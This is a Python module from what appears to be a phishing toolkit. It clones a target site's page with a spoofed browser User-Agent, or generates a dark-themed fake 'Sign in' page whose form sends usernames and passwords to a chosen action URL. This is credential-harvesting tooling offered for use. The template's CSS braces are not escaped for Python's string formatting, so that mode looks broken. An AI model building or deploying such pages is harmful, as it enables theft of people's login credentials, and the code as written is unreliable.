# Page Generator
# clone target page for local use

from Config.Colors import *
from Config.Util import *

import os
import re


DEFAULT_TEMPLATES = {
    "generic": """<!doctype html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>{title}</title>
<style>
body{font-family:-apple-system,Segoe UI,Roboto,sans-serif;background:#0d1117;color:#c9d1d9;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;padding:16px;box-sizing:border-box;}
.card{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:32px;width:100%;max-width:360px;box-sizing:border-box;}
h1{font-size:20px;margin:0 0 20px;color:#fff;}
label{display:block;font-size:13px;color:#8b949e;margin-bottom:4px;}
input{width:100%;padding:10px;margin:0 0 14px;background:#0d1117;border:1px solid #30363d;color:#c9d1d9;border-radius:6px;box-sizing:border-box;font-size:15px;}
button{width:100%;padding:11px;background:#238636;color:#fff;border:none;border-radius:6px;cursor:pointer;font-weight:600;font-size:15px;}
</style></head><body><div class="card"><h1>{title}</h1>
<form method="POST" action="{action}">
<label>Username or email</label>
<input type="text" name="username" required autofocus autocomplete="username">
<label>Password</label>
<input type="password" name="password" required autocomplete="current-password">
<button type="submit">{button}</button>
</form></div></body></html>""",
}


def _strip_title(html):
    m = re.search(r"<title[^>]*>(.*?)</title>", html, re.I | re.S)
    return (m.group(1).strip() if m else "Sign in")[:80]


def _rewrite_links(html, target_base):
    # rewrite absolute same-origin links to target_base so it works offline
    from urllib.parse import urlparse
    host = urlparse(target_base).netloc
    # keep external links alone, rewrite relative
    html = re.sub(r'(href|src|action)=(["\'])/', r'\1=\2' + target_base + '/', html)
    return html


def run():
    banner()
    log("Page Generator", "info")
    print(f"{DIM}clone a target page for local use or pick a built-in template.{RESET}")
    print()
    print(f"  {GREEN}[1]{RESET} clone a live url")
    print(f"  {GREEN}[2]{RESET} generate from built-in template")
    mode = input_line("select > ").strip()

    try:
        import requests
    except ImportError:
        log("pip install requests", "err"); pause(); return

    if mode == "1":
        url = input_line("url to clone > ").strip()
        if not url:
            pause(); return
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        log(f"fetching {url} ...", "info")
        try:
            r = requests.get(url, headers={"User-Agent":
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
                timeout=15)
            html = r.text
        except Exception as e:
            log(f"failed: {e}", "err"); pause(); return

        title = _strip_title(html)
        log(f"cloned {len(html)} bytes, title: {title!r}", "ok")
        out_name = input_line("save as [cloned.html] > ").strip() or "cloned.html"
        if not out_name.endswith(".html"):
            out_name += ".html"

        tmpl_dir = template_dir()
        path = os.path.join(tmpl_dir, out_name)
        with open(path, "w", encoding="utf-8") as f:
            f.write(html)
        log(f"saved -> {path}", "ok")

    elif mode == "2":
        keys = list(DEFAULT_TEMPLATES.keys())
        print(f"\n{WHITE}templates:{RESET}")
        for i, k in enumerate(keys, 1):
            print(f"  {GREEN}[{i}]{RESET} {k}")
        sel = input_line("pick > ").strip()
        if not sel.isdigit() or not (1 <= int(sel) <= len(keys)):
            pause(); return
        key = keys[int(sel) - 1]
        title = input_line("title [Sign in] > ").strip() or "Sign in"
        button = input_line("button text [Sign in] > ").strip() or "Sign in"
        action = input_line("form action [/submit] > ").strip() or "/submit"
        html = DEFAULT_TEMPLATES[key].format(title=title, button=button, action=action)
        out_name = f"{key}_{int(__import__('time').time())}.html"
        path = os.path.join(template_dir(), out_name)
        with open(path, "w", encoding="utf-8") as f:
            f.write(html)
        log(f"saved -> {path}", "ok")
    else:
        log("bad choice", "warn")

    pause()